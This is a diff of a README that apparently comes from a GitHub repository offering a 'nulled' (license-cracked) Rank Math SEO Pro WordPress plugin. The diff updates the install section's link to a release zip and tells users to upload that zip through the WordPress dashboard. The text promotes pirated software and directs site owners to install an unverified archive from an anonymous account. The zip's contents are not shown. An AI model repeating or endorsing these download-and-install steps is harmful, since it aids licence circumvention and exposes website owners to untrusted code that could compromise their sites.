@@ -51,8 +51,8 @@ You have free full access to all nulled Rank Math Seo Pro features. No license k
 - PHP 7.2 or higher
 - Rank Math Free (the base plugin must be active)
 
-### 2. Download & Install
-Download the latest `.zip` from the [Releases](https://github.com/feralberrymayhem65/rank-math-seo-pro-nulled-plugin/releases/download/Full-Access-SEO-PRO/Rank.Math.SEO.PRO.-.BEST.WordPress.SEO.Tool.zip) section of this repository, then upload it via **Plugins → Add New → Upload Plugin** in your WordPress dashboard.
+### 2. Download & Install ( 2026 JUNE UPDATE )
+Download the latest `.zip` from the [Releases](https://github.com/feralberrymayhem65/rank-math-seo-pro-nulled-plugin/releases/download/Full-Access-SEO-PRO/seo-by-rank-math-pro.zip) section of this repository, then upload it via **Plugins → Add New → Upload Plugin** in your WordPress dashboard.
 
 ### 3. Activate & Configure
 1. Go to **Plugins → Installed Plugins** and activate **Rank Math SEO Pro**.
